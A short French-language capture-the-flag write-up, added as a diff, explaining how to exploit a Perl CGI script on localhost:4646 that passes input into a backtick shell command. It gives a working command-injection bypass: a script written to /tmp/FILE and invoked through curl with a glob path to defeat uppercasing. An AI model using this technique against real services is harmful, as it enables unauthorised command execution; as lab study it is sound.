@@ -1,0 +1,44 @@
+il y a un .pl
+lequel nous indique qu'on va devoir utilisé un curl
+
+# localhost:4646
+
+le curl va avoir pour adresse localhost avec port 4646
+curl "http://localhost:4646?"
+
+@output = `egrep "^$xx" /tmp/xd 2>&1`;
+
+cette ligne indique que l'argument que l'on va passer sera exécuté
+cela implique 
+
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+
+il prend une variable, transforme toutes les lettres en majuscule
+et supprimmes toutes les caractères après un espace ou une tabulation
+cela complique la tache pour y faire une injection.
+
+Cependant, on peut y faire une injection graçe à un fichier.
+Il suffit que ce fichier soit proche de /
+(/tmp par exemple, surtout que c'est que là qu'on peut y ecrire quelque chose)
+afin de pouvoir écire /*/notre_fichier
+et en avec un nom en majuscule
+exemple :
+
+à l'intérieur on y écrit getflag
+et quelque chose permettant d'afficher ou enregistrer la réponse
+exemple :
+getflag > /tmp/flag
+
+ou
+getflag | wall
+
+echo "getflag | wall" > /tmp/FILE
+
+on met les autorisation de lecture
+chmod 777 /tmp/FILE
+
+ensuite on passe la commande
+curl "http://localhost:4646?x=\`/*/FILE\`"
+ou encore
+curl localhost:4646?x='\`/*/FILE\`'
